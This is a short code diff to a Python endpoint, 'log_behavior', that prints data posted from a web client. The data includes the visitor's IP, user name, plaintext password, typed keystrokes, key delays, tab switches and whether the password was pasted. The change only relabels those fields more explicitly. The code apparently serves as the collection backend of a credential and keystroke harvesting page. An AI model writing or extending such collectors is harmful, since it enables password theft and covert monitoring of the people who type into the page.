@@ -9,14 +9,15 @@ def log_behavior():
 
     print("\n>> Registro de actividad detectado:")
     print(f"IP: {ip}")
-    print(f"U: {d.get('u')}")
-    print(f"C: {d.get('c')}")
-    print(f"T: {d.get('t')}")
-    print(f"TT (tiempo total): {d.get('tt')} ms")
-    print(f"B (backspaces): {d.get('b')}")
-    print(f"VC (cambios de visibilidad): {d.get('vc')}")
-    print(f"PC (¿pegado?): {'Sí' if d.get('pc') else 'No'}")
-    print(f"KD (key delays): {d.get('kd')}\n")
+    print(f"Usuario: {d.get('u')}")
+    print(f"Clave: {d.get('c')}")
+    print(f"Teclas: {d.get('t')}")
+    print(f"Tiempo Total): {d.get('tt')} ms")
+    print(f"Backspaces): {d.get('b')}")
+    print(f"Cambios de pestañas): {d.get('vc')}")
+    print(f"¿Pegó la clave?): {'Sí' if d.get('pc') else 'No'}")
+    print(f"Key Delays): {d.get('kd')}\n")
+    print(f"-------------------------------------------------")
 
     return '', 204
 
